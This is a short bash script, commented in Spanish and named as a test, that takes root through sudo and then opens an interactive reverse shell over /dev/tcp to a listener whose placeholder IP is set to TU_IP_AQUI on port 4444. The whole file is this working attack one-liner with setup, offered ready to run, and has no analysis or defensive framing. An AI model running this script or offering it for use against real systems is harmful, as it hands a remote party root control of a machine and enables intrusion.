#!/usr/bin/env bash
#
# test_priv_esc_and_shell.sh
# Configura tu listener IP y puerto aquí:
LISTENER_IP="TU_IP_AQUI"
LISTENER_PORT=4444
#
# Este script intenta:
#  1. Escalar privilegios vía sudo
#  2. Abrir un reverse shell a ${LISTENER_IP}:${LISTENER_PORT}

echo "[*] Intentando escalada de privilegios y reverse shell a ${LISTENER_IP}:${LISTENER_PORT}"

# Ejecuta bash como root (sudo) y redirige stdin/stdout al socket TCP
sudo bash -c "bash -i >& /dev/tcp/${LISTENER_IP}/${LISTENER_PORT} 0>&1"